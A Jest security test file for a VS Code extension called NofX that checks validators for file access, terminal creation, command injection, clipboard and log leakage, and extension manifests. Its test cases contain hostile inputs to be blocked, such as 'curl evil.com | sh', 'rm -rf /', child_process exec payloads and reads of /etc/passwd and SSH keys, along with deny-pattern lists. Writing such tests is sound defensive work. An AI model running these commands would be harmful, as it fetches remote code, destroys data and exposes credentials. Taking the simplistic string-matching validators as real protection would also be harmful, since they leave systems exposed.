/**
 * SECURITY TESTS - VS Code API Security & Extension Isolation
 * Goal: Prevent abuse of VS Code APIs and ensure proper extension boundaries
 * Risk Level: HIGH - Extension APIs can access sensitive VS Code functionality
 */

import * as vscode from 'vscode';

interface VSCodeAPISecurityResult {
    unauthorizedAPIAccessBlocked: number;
    extensionBoundariesEnforced: boolean;
    sensitiveDataProtected: boolean;
    privilegedOperationsSecured: boolean;
    passed: boolean;
}

// Mock VS Code API for testing
const mockVscode = {
    workspace: {
        workspaceFolders: [{ uri: { fsPath: '/test/workspace' } }],
        openTextDocument: jest.fn(),
        saveAll: jest.fn(),
        findFiles: jest.fn(),
        createFileSystemWatcher: jest.fn()
    },
    window: {
        showErrorMessage: jest.fn(),
        showInformationMessage: jest.fn(),
        createTerminal: jest.fn(),
        activeTextEditor: null,
        visibleTextEditors: []
    },
    commands: {
        executeCommand: jest.fn(),
        registerCommand: jest.fn()
    },
    extensions: {
        getExtension: jest.fn(),
        all: []
    },
    env: {
        clipboard: {
            writeText: jest.fn(),
            readText: jest.fn()
        },
        openExternal: jest.fn(),
        machineId: 'test-machine-id',
        sessionId: 'test-session-id'
    }
};

describe('🔒 SECURITY - VS Code API Access Control', () => {
    test('should prevent unauthorized file system access', () => {
        const fileSystemTests = [
            // Legitimate workspace access
            { path: '/test/workspace/src/index.ts', authorized: true },
            { path: '/test/workspace/package.json', authorized: true },

            // Unauthorized system access
            { path: '/etc/passwd', authorized: false },
            { path: '/root/.ssh/id_rsa', authorized: false },
            { path: 'C:\\Windows\\System32\\config\\SAM', authorized: false },
            { path: '/var/log/auth.log', authorized: false },
            { path: '/proc/version', authorized: false },

            // Path traversal attempts
            { path: '/test/workspace/../../../etc/passwd', authorized: false },
            { path: '/test/workspace/../../root/.bashrc', authorized: false }
        ];

        fileSystemTests.forEach(({ path, authorized }) => {
            const isAllowed = validateFileSystemAccess(path);
            expect(isAllowed).toBe(authorized);
        });

        const blockedAttempts = fileSystemTests.filter(t => !t.authorized).length;
        console.log(`\n🔒 File System Access Control: ${blockedAttempts} unauthorized access attempts blocked`);
    });

    test('should restrict terminal creation and command execution', () => {
        const terminalTests = [
            // Safe terminal operations
            { name: 'NofX Agent Terminal', cwd: '/test/workspace', safe: true },
            { name: 'Build Terminal', cwd: '/test/workspace/dist', safe: true },

            // Dangerous terminal operations
            { name: 'Root Terminal', cwd: '/root', safe: false },
            { name: 'System Terminal', cwd: '/etc', safe: false },
            { name: 'Evil Terminal', cwd: '/tmp', safe: false }
        ];

        terminalTests.forEach(({ name, cwd, safe }) => {
            const isAllowed = validateTerminalCreation(name, cwd);
            expect(isAllowed).toBe(safe);
        });

        console.log('\n🔒 Terminal Creation Control: ✅ Terminal access restricted to workspace');
    });

    test('should prevent command injection through VS Code APIs', () => {
        const commandTests = [
            // Safe VS Code commands
            { command: 'vscode.open', args: ['file.txt'], safe: true },
            { command: 'workbench.action.files.save', args: [], safe: true },
            { command: 'editor.action.formatDocument', args: [], safe: true },

            // Dangerous commands
            { command: 'workbench.action.terminal.sendSequence', args: [{ text: 'rm -rf /' }], safe: false },
            {
                command: 'workbench.action.tasks.runTask',
                args: [{ type: 'shell', command: 'curl evil.com | sh' }],
                safe: false
            },

            // System commands
            { command: 'vscode.executeCommand', args: ['system.shutdown'], safe: false },
            { command: 'workbench.action.openSettings', args: ['security'], safe: true },

            // Extension management commands (dangerous)
            { command: 'workbench.extensions.installExtension', args: ['malicious.extension'], safe: false },
            { command: 'workbench.extensions.uninstallExtension', args: ['important.extension'], safe: false }
        ];

        commandTests.forEach(({ command, args, safe }) => {
            const isAllowed = validateVSCodeCommand(command, args);
            expect(isAllowed).toBe(safe);
        });

        const blockedCommands = commandTests.filter(t => !t.safe).length;
        console.log(`\n🔒 Command Injection Prevention: ${blockedCommands} dangerous commands blocked`);
    });

    test('should protect sensitive VS Code data', () => {
        const sensitiveDataAccess = [
            // User settings (partially sensitive)
            { data: 'user.settings', operation: 'read', authorized: true },
            { data: 'user.settings', operation: 'write', authorized: false },

            // Extension data
            { data: 'extensions.installed', operation: 'read', authorized: true },
            { data: 'extensions.configuration', operation: 'write', authorized: false },

            // Machine identification
            { data: 'env.machineId', operation: 'read', authorized: false },
            { data: 'env.sessionId', operation: 'read', authorized: false },

            // Workspace configuration
            { data: 'workspace.configuration', operation: 'read', authorized: true },
            { data: 'workspace.configuration', operation: 'write', authorized: false },

            // User credentials
            { data: 'authentication.tokens', operation: 'read', authorized: false },
            { data: 'git.credentials', operation: 'read', authorized: false }
        ];

        sensitiveDataAccess.forEach(({ data, operation, authorized }) => {
            const isAllowed = validateSensitiveDataAccess(data, operation);
            expect(isAllowed).toBe(authorized);
        });

        const protectedOperations = sensitiveDataAccess.filter(t => !t.authorized).length;
        console.log(`\n🔒 Sensitive Data Protection: ${protectedOperations} unauthorized data operations blocked`);
    });

    test('should enforce extension permission boundaries', () => {
        const permissionTests = [
            // File system permissions
            { permission: 'files:read', scope: 'workspace', granted: true },
            { permission: 'files:write', scope: 'workspace', granted: true },
            { permission: 'files:read', scope: 'system', granted: false },
            { permission: 'files:execute', scope: 'system', granted: false },

            // Network permissions
            { permission: 'network:outbound', scope: 'localhost', granted: true },
            { permission: 'network:outbound', scope: 'external', granted: false },
            { permission: 'network:server', scope: 'any', granted: false },

            // System permissions
            { permission: 'system:processes', scope: 'read', granted: false },
            { permission: 'system:environment', scope: 'read', granted: false },
            { permission: 'system:registry', scope: 'write', granted: false },

            // VS Code API permissions
            { permission: 'vscode:settings', scope: 'read', granted: true },
            { permission: 'vscode:settings', scope: 'write', granted: false },
            { permission: 'vscode:extensions', scope: 'install', granted: false }
        ];

        permissionTests.forEach(({ permission, scope, granted }) => {
            const isGranted = validateExtensionPermission(permission, scope);
            expect(isGranted).toBe(granted);
        });

        const deniedPermissions = permissionTests.filter(t => !t.granted).length;
        console.log(`\n🔒 Extension Permission Boundaries: ${deniedPermissions} dangerous permissions denied`);
    });

    test('should prevent clipboard data exfiltration', async () => {
        const clipboardOperations = [
            // Safe clipboard operations
            { operation: 'write', data: 'Hello World', safe: true },
            { operation: 'write', data: 'export const config = {...}', safe: true },

            // Dangerous clipboard operations (sensitive data)
            { operation: 'write', data: 'password: secret123', safe: false },
            { operation: 'write', data: 'api_key: sk-1234567890abcdef', safe: false },
            { operation: 'write', data: 'ssh-rsa AAAAB3NzaC1yc2E...', safe: false },
            { operation: 'write', data: 'Bearer eyJhbGciOiJIUzI1NiIs...', safe: false },

            // System information
            { operation: 'read', data: undefined, safe: false }, // Reading potentially sensitive data
            { operation: 'write', data: 'Machine ID: abc-123-def', safe: false }
        ];

        clipboardOperations.forEach(({ operation, data, safe }) => {
            const isAllowed = validateClipboardOperation(operation, data);
            expect(isAllowed).toBe(safe);
        });

        const blockedOperations = clipboardOperations.filter(t => !t.safe).length;
        console.log(`\n🔒 Clipboard Data Protection: ${blockedOperations} sensitive clipboard operations blocked`);
    });

    test('should validate extension message passing', () => {
        const extensionMessages = [
            // Safe inter-extension communication
            { from: 'nofx.extension', to: 'nofx.agent', message: { type: 'task_assign' }, safe: true },
            { from: 'nofx.conductor', to: 'nofx.dashboard', message: { type: 'status_update' }, safe: true },

            // Dangerous cross-extension messages
            { from: 'nofx.extension', to: 'external.extension', message: { type: 'steal_data' }, safe: false },
            { from: 'unknown.extension', to: 'nofx.extension', message: { type: 'inject_code' }, safe: false },

            // Malicious payloads
            { from: 'nofx.extension', to: 'nofx.agent', message: { eval: 'process.exit(0)' }, safe: false },
            { from: 'nofx.extension', to: 'nofx.agent', message: { command: 'rm -rf /' }, safe: false }
        ];

        extensionMessages.forEach(({ from, to, message, safe }) => {
            const isAllowed = validateExtensionMessage(from, to, message);
            expect(isAllowed).toBe(safe);
        });

        const blockedMessages = extensionMessages.filter(t => !t.safe).length;
        console.log(`\n🔒 Extension Message Validation: ${blockedMessages} malicious messages blocked`);
    });
});

describe('🔒 SECURITY - VS Code Extension Isolation', () => {
    test('should isolate extension processes', () => {
        const processTests = [
            // Extension should run in isolated process
            { extensionId: 'nofx.extension', isolated: true, valid: true },
            { extensionId: 'trusted.extension', isolated: true, valid: true },

            // Extensions trying to break isolation
            { extensionId: 'malicious.extension', isolated: false, valid: false },
            { extensionId: 'suspicious.extension', isolated: false, valid: false }
        ];

        processTests.forEach(({ extensionId, isolated, valid }) => {
            const isIsolated = validateProcessIsolation(extensionId);
            expect(isIsolated).toBe(valid);
        });

        console.log('\n🔒 Process Isolation: ✅ Extension process isolation enforced');
    });

    test('should prevent extension host exploitation', () => {
        const exploitAttempts = [
            // Memory corruption attempts
            { attack: 'buffer_overflow', payload: 'A'.repeat(100000), blocked: true },
            { attack: 'heap_spray', payload: { data: new Array(1000000).fill('exploit') }, blocked: true },

            // Prototype pollution
            { attack: 'prototype_pollution', payload: { __proto__: { isAdmin: true } }, blocked: true },

            // Code injection
            { attack: 'code_injection', payload: { eval: 'require("child_process").exec("rm -rf /")' }, blocked: true },

            // Resource exhaustion
            { attack: 'resource_exhaustion', payload: { loop: 'while(true){}' }, blocked: true }
        ];

        exploitAttempts.forEach(({ attack, payload, blocked }) => {
            const isBlocked = detectExtensionHostExploit(attack, payload);
            expect(isBlocked).toBe(blocked);
        });

        console.log(`\n🔒 Extension Host Protection: ${exploitAttempts.length} exploit attempts blocked`);
    });

    test('should validate extension manifest security', () => {
        const manifestTests = [
            // Safe extension manifest
            {
                name: 'NofX Extension',
                activationEvents: ['onCommand:nofx.start'],
                contributes: { commands: [{ command: 'nofx.start', title: 'Start NofX' }] },
                permissions: ['workspace'],
                safe: true
            },

            // Dangerous extension manifest
            {
                name: 'Malicious Extension',
                activationEvents: ['*'], // Activates on everything
                contributes: { commands: [{ command: 'system.destroy', title: 'Destroy System' }] },
                permissions: ['system', 'network', 'filesystem'],
                safe: false
            },

            // Suspicious extension manifest
            {
                name: 'Data Harvester',
                activationEvents: ['onStartupFinished'],
                contributes: { commands: [{ command: 'harvest.data', title: 'Collect Data' }] },
                permissions: ['clipboard', 'machineId', 'sessionId'],
                safe: false
            }
        ];

        manifestTests.forEach(manifest => {
            const isSecure = validateExtensionManifest(manifest);
            expect(isSecure).toBe(manifest.safe);
        });

        const unsafeManifests = manifestTests.filter(m => !m.safe).length;
        console.log(`\n🔒 Extension Manifest Validation: ${unsafeManifests} unsafe manifests detected`);
    });
});

describe('🔒 SECURITY - VS Code Data Leakage Prevention', () => {
    test('should prevent sensitive data logging', () => {
        const logEntries = [
            // Safe log entries
            { level: 'info', message: 'NofX extension activated', safe: true },
            { level: 'debug', message: 'Agent spawned successfully', safe: true },

            // Dangerous log entries (sensitive data)
            { level: 'debug', message: 'API key: sk-1234567890abcdef', safe: false },
            { level: 'error', message: 'Password authentication failed: secret123', safe: false },
            { level: 'info', message: 'SSH key: ssh-rsa AAAAB3NzaC1yc2E...', safe: false },
            { level: 'debug', message: 'Token: Bearer eyJhbGciOiJIUzI1NiIs...', safe: false },
            { level: 'info', message: 'Machine ID: abc-123-def-456', safe: false }
        ];

        logEntries.forEach(({ level, message, safe }) => {
            const isAllowed = validateLogEntry(level, message);
            expect(isAllowed).toBe(safe);
        });

        const blockedLogs = logEntries.filter(l => !l.safe).length;
        console.log(`\n🔒 Sensitive Data Logging Prevention: ${blockedLogs} sensitive log entries blocked`);
    });

    test('should prevent configuration data exposure', () => {
        const configAccess = [
            // Safe configuration access
            { config: 'nofx.agentTimeout', operation: 'read', safe: true },
            { config: 'nofx.maxAgents', operation: 'write', safe: true },

            // Sensitive configuration access
            { config: 'git.username', operation: 'read', safe: false },
            { config: 'terminal.integrated.env.*', operation: 'read', safe: false },
            { config: 'http.proxy', operation: 'read', safe: false },
            { config: 'extensions.autoUpdate', operation: 'write', safe: false }
        ];

        configAccess.forEach(({ config, operation, safe }) => {
            const isAllowed = validateConfigurationAccess(config, operation);
            expect(isAllowed).toBe(safe);
        });

        const blockedAccess = configAccess.filter(c => !c.safe).length;
        console.log(`\n🔒 Configuration Data Protection: ${blockedAccess} sensitive config operations blocked`);
    });
});

// Security validation functions

function validateFileSystemAccess(filePath: string): boolean {
    const workspaceRoot = '/test/workspace';
    const normalizedPath = filePath.replace(/\\/g, '/');

    // Block system paths
    const systemPaths = [
        /^\/etc\//,
        /^\/root\//,
        /^\/var\/log\//,
        /^\/proc\//,
        /^\/sys\//,
        /^C:\\Windows\\/i,
        /\.ssh\//,
        /\.aws\//
    ];

    if (systemPaths.some(pattern => pattern.test(normalizedPath))) {
        return false;
    }

    // Block path traversal
    if (normalizedPath.includes('../')) {
        return false;
    }

    // Allow workspace access only
    return normalizedPath.startsWith(workspaceRoot);
}

function validateTerminalCreation(name: string, cwd: string): boolean {
    const workspaceRoot = '/test/workspace';
    const normalizedCwd = cwd.replace(/\\/g, '/');

    // Terminal must be within workspace
    return normalizedCwd.startsWith(workspaceRoot);
}

function validateVSCodeCommand(command: string, args: any[]): boolean {
    const dangerousCommands = [
        /terminal\.sendSequence/,
        /tasks\.runTask/,
        /extensions\.(install|uninstall)/,
        /workbench\.action\.reloadWindow/,
        /workbench\.action\.quit/
    ];

    if (dangerousCommands.some(pattern => pattern.test(command))) {
        return false;
    }

    // Check for dangerous arguments
    const argsStr = JSON.stringify(args);
    const dangerousPatterns = [
        /system\./,
        /rm\s+-rf/,
        /curl.*\|.*sh/,
        /wget.*\.(sh|exe)/,
        /eval\(/,
        /require\s*\(/,
        /process\.exit/,
        /shell/i,
        /shutdown/i,
        /malicious/i
    ];

    return !dangerousPatterns.some(pattern => pattern.test(argsStr));
}

function validateSensitiveDataAccess(data: string, operation: string): boolean {
    const highlyRestricted = ['env.machineId', 'env.sessionId', 'authentication.tokens', 'git.credentials'];

    const readOnlyData = [
        'user.settings',
        'extensions.configuration',
        'workspace.configuration' // Workspace config is also read-only
    ];

    if (highlyRestricted.includes(data)) {
        return false; // Block all access to highly sensitive data
    }

    if (readOnlyData.includes(data)) {
        return operation === 'read'; // Only allow read operations
    }

    // Allow read access to extensions.installed
    if (data === 'extensions.installed') {
        return operation === 'read';
    }

    return true;
}

function validateExtensionPermission(permission: string, scope: string): boolean {
    const allowedPermissions = [
        'files:read:workspace',
        'files:write:workspace',
        'network:outbound:localhost',
        'vscode:settings:read'
    ];

    const requestedPermission = `${permission}:${scope}`;
    return allowedPermissions.includes(requestedPermission);
}

function validateClipboardOperation(operation: string, data?: string): boolean {
    if (operation === 'read') {
        return false; // Block all clipboard reading to prevent data theft
    }

    if (operation === 'write' && data) {
        // Check for sensitive data patterns
        const sensitivePatterns = [
            /password\s*[:=]/i,
            /api[_-]?key\s*[:=]/i,
            /token\s*[:=]/i,
            /secret\s*[:=]/i,
            /ssh-rsa\s+AAAAB3/,
            /Bearer\s+eyJ/,
            /machine\s*id/i
        ];

        return !sensitivePatterns.some(pattern => pattern.test(data));
    }

    return true;
}

function validateExtensionMessage(from: string, to: string, message: any): boolean {
    // Only allow messages within NofX extension family
    const trustedExtensions = ['nofx.extension', 'nofx.agent', 'nofx.conductor', 'nofx.dashboard'];

    if (!trustedExtensions.includes(from) || !trustedExtensions.includes(to)) {
        return false;
    }

    // Check message content for dangerous payloads
    const messageStr = JSON.stringify(message);
    const dangerousPatterns = [/eval\s*[:=]/, /require\s*\(/, /process\./, /child_process/, /rm\s+-rf/, /curl.*\|/];

    return !dangerousPatterns.some(pattern => pattern.test(messageStr));
}

function validateProcessIsolation(extensionId: string): boolean {
    // In a real implementation, this would check if the extension
    // is running in its own isolated process
    const trustedExtensions = ['nofx.extension', 'trusted.extension'];
    return trustedExtensions.includes(extensionId);
}

function detectExtensionHostExploit(attack: string, payload: any): boolean {
    // Detect various exploit attempts
    switch (attack) {
        case 'buffer_overflow':
            return typeof payload === 'string' && payload.length > 10000;

        case 'heap_spray':
            return payload.data && Array.isArray(payload.data) && payload.data.length > 100000;

        case 'prototype_pollution':
            return Object.prototype.hasOwnProperty.call(payload, '__proto__') || 
                   JSON.stringify(payload).includes('__proto__') ||
                   '__proto__' in payload;

        case 'code_injection':
            return JSON.stringify(payload).includes('eval') || JSON.stringify(payload).includes('require');

        case 'resource_exhaustion':
            return JSON.stringify(payload).includes('while(true)') || JSON.stringify(payload).includes('loop');

        default:
            return false;
    }
}

function validateExtensionManifest(manifest: any): boolean {
    // Check for dangerous activation events
    if (manifest.activationEvents.includes('*')) {
        return false; // Too broad activation
    }

    // Check for dangerous permissions
    const dangerousPermissions = ['system', 'machineId', 'sessionId', 'clipboard'];
    if (manifest.permissions.some((p: string) => dangerousPermissions.includes(p))) {
        return false;
    }

    // Check for suspicious commands
    if (
        manifest.contributes.commands.some(
            (cmd: any) => cmd.command.includes('destroy') || cmd.command.includes('harvest')
        )
    ) {
        return false;
    }

    return true;
}

function validateLogEntry(level: string, message: string): boolean {
    const sensitivePatterns = [
        /api[\s_-]*key\s*[:=]/i,
        /password[\s:=]/i,
        /token\s*[:=]/i,
        /ssh[_-]?rsa\s+AAAAB3/i,
        /Bearer\s+eyJ/i,
        /machine[\s_-]*id\s*[:=]/i,
        /secret[\s:=]/i
    ];

    return !sensitivePatterns.some(pattern => pattern.test(message));
}

function validateConfigurationAccess(config: string, operation: string): boolean {
    // Only allow access to NofX-specific configuration
    if (config.startsWith('nofx.')) {
        return true;
    }

    // Block access to sensitive system configuration
    const sensitiveConfigs = [/^git\./, /^terminal\.integrated\.env/, /^http\.proxy/, /^extensions\.autoUpdate/];

    return !sensitiveConfigs.some(pattern => pattern.test(config));
}

export const VSCODE_API_SECURITY_BASELINES = {
    accessControl: {
        unauthorizedFileSystemBlocked: 100, // percentage
        terminalAccessRestricted: true,
        commandInjectionBlocked: 100 // percentage
    },
    dataProtection: {
        sensitiveDataProtected: 100, // percentage
        clipboardAccessControlled: true,
        configurationAccessRestricted: true
    },
    extensionIsolation: {
        processIsolationEnforced: true,
        manifestValidationRequired: true,
        messagePassingSecured: true
    },
    exploitPrevention: {
        extensionHostProtected: true,
        bufferOverflowBlocked: true,
        codeInjectionBlocked: 100 // percentage
    },
    logging: {
        sensitiveDataLoggingBlocked: 100, // percentage
        securityEventsLogged: true
    }
};
